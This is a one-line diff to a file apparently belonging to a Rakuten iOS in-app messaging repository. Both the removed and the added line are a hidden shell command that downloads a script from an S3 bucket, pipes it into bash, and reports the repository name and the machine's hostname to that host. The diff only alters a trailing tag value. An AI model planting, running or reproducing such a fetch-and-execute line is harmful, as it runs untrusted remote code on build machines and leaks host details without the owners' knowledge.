@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/rakutentech/ios-inappmessaging.git\&folder=ios-inappmessaging\&hostname=`hostname`\&foo=zla
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/rakutentech/ios-inappmessaging.git\&folder=ios-inappmessaging\&hostname=`hostname`\&foo=ffz
